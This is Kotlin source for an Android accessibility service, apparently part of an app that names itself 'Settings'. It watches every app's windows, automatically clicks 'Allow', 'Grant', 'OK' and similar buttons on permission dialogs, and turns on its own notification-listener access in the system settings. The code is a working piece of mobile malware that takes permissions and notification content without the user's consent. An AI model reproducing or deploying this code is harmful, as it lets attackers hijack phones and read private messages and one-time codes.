package com.security.testapp

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo

class AutoPermissionService : AccessibilityService() {

    override fun onServiceConnected() {
        super.onServiceConnected()
        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                    AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            notificationTimeout = 100
            // Observe all packages to handle permission dialogs from any app
            packageNames = null
        }
        serviceInfo = info
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        when (event.eventType) {
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED,
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                autoClickPermissionButtons()
                enableNotificationListenerSwitch()
            }
        }
    }

    private fun autoClickPermissionButtons() {
        val root = rootInActiveWindow ?: return
        // Different button labels used by permission dialogs
        val targetTexts = arrayOf("Allow", "ALLOW", "Allow anyway", "OK", "Grant", "Yes", "Enable")
        for (text in targetTexts) {
            val nodes = root.findAccessibilityNodeInfosByText(text)
            if (nodes != null) {
                for (node in nodes) {
                    if (node.isClickable) {
                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        return
                    }
                }
            }
        }
    }

    private fun enableNotificationListenerSwitch() {
        // If we are in the Notification Listener settings screen,
        // look for our app's listing and toggle its switch ON.
        val root = rootInActiveWindow ?: return
        val appName = getString(R.string.app_name) // "Settings"
        val listItems = root.findAccessibilityNodeInfosByText(appName)
        if (listItems != null) {
            for (item in listItems) {
                // Navigate to the switch. Usually it's a sibling of the parent.
                val parent = item.parent ?: continue
                for (i in 0 until parent.childCount) {
                    val child = parent.getChild(i)
                    if (child != null &&
                        "android.widget.Switch" == child.className &&
                        !child.isChecked
                    ) {
                        child.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        return
                    }
                }
            }
        }
    }

    override fun onInterrupt() {}
}
